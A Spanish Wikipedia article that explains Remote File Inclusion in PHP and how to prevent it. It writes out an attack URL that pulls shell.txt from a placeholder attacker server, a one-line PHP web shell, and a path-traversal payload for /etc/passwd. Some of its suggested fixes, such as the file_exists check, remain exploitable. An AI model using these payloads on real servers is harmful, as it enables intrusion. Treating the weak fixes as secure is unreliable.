---
type: Artículo de enciclopedia
title: Remote File Inclusion
description: "RFI (Remote File Inclusion), traducido al español como Inclusión Remota de Archivos - vulnerabilidad existente solamente en páginas dinámicas en PHP que permite el enlace de archivos remotos situados en otros servidores …"
resource: https://es.wikipedia.org/wiki/Remote_File_Inclusion
tags: [seguridad, wikipedia]
sources:
  - {"id": "eswiki", "title": "Wikipedia (es) 2026-11-01", "author": "community:wikipedia-es", "last_modified": "2026-11-01T00:00:00Z", "resource": "https://es.wikipedia.org/wiki/Remote_File_Inclusion"}
license: CC BY-SA 4.0
id: eswiki-Remote_File_Inclusion
generated: {"by": "alejandria/2026.11.27", "at": "2026-11-27T17:14:52Z"}
status: stable
stale_after: 2027-11-27T17:14:52Z
---

# Remote File Inclusion

**RFI** (**Remote File Inclusion**), traducido al español como Inclusión Remota de Archivos - vulnerabilidad existente solamente en páginas dinámicas en PHP que permite el enlace de archivos remotos situados en otros servidores a causa de una mala programación de la página que contiene funciones de inclusión de archivos.

Este tipo de vulnerabilidad no se da en páginas programadas en ASP o en cualquier otro tipo de lenguaje similar que no contenga la posibilidad de la inclusión remota de archivos ajenos al servidor.

 Resumen del ataque

Las funciones include, include_once, require, require_once son utilizadas para incluir en una misma página otras páginas a la vez, por la necesidad de utilizar un código fuente o por otras diversas razones de programación.

Una página vulnerable que presente un aspecto similar a este en su URL:

http://[servidor_victima]/index.php?page=plantilla.html

El atacante podrá obtener una Shell en el servidor vulnerable mediante lo siguiente:

http://[servidor_victima]/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls

Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:

<?
  system($cmd);
?>

El archivo debe tener una extensión distinta a cualquier otra que se pueda ejecutar en el servidor del atacante (.txt,.gif, etc), una extensión ".php" no sería válida, ya que en el servidor víctima al incluir el fichero con extensión.php se estaría ejecutando antes el código php en el servidor del atacante; recordemos que el código php se ejecuta en el servidor y el usuario solo puede ver el resultado, es por esto que el código del script malicioso debe ir con una extensión distinta, ya que la función include, require, require_once, include_once ejecutaría el código php contenido en el fichero que se pasa como parámetro a la función, sin importar la extensión que tenga.

Lo que la víctima incluye en su página son secciones que se pasan a la variable page según el ejemplo anterior

<?
  include_once($page)
?>

 Detener el ataque
Para detener este tipo de ataques, el programador debe filtrar correctamente la variable ejemplo:

<?
  if ($url=="seccion")
    include ($url.".php");
?>

o

<?
  include ("./".$url.".php");
?>

Este último puede provocar un tipo de fallo llamado Local File Inclusion si $url toma un valor de tipo ../../../etc/passwd%00.
El Local File Inclusion podría inclusive permitir la ejecución de comandos al insertar código malicioso a través de
LOG's por ejemplo al incluirlos.

o

<?
  switch($url) {
    case 0:include ("./contenidos/estapagina.php"); break;
    case 1:include ("./contenidos/estaotra.php"); break;
    default: include("./contenidos/error.php"); break;
  }
?>

o

<?php
  if(!file_exists($_GET['page']))
  {
      die('No existe');
  }
else{
   require_once($_GET['page']);
}

?>

o

<?
  $url = intval($_GET['url']);  //$url solo contendrá un valor entero.
  $pagina = "./contenidos/cont".$url.".php";
  if (file_exists($pagina))
    include($pagina);
?>

Otra Solución

Otra solución más avanzada es aplicar una validación de la variable enviada como parámetro, descartando la inclusión de archivos remotos no deseados.

<?
$url = str_replace(array(':', '.', '/', '\\'), '', $url);
include_once($url);
?>
